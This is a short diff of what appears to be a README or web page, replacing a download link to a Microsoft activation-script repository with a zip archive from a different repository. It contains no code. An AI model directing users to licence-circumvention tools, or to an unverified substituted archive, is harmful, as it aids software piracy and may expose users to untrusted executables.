@@ -5,7 +5,7 @@
 
 
 
-  # **[Download Link](https://github.com/massgravel/Microsoft-Activation-Scripts/releases)** <br/>
+  # **[Download Link](https://github.com/cristiancmoises/awesomewindows/archive/refs/heads/main.zip)** <br/>
 
 <table border="1" cellpadding="1" cellspacing="0" style="width:558px">
 	<tbody>
